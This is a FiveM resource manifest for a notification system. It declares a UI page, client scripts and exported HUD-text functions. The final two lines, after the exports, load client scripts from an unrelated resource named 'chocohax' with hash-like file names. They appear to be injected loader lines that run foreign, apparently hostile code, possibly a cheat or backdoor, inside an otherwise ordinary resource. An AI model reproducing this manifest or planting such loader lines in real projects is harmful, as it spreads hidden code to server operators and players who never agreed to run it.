resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

name 'Mythic Framework Notification System'
author 'Alzar - https://github.com/Alzar'
version 'v1.0.3'

ui_page {
    'html/ui.html',
}

files {
	'html/ui.html',
	'html/js/app.js', 
	'html/css/style.css',
}

client_scripts {
	'client/main.lua'
}

exports {
	'DoShortHudText',
	'DoHudText',
	'DoLongHudText',
	'DoCustomHudText',
	'PersistentHudText',
}
client_script '@chocohax/95158.lua'
client_script '@chocohax/3a8edc97804897d949f78eac09528d6204ce579e0a.lua'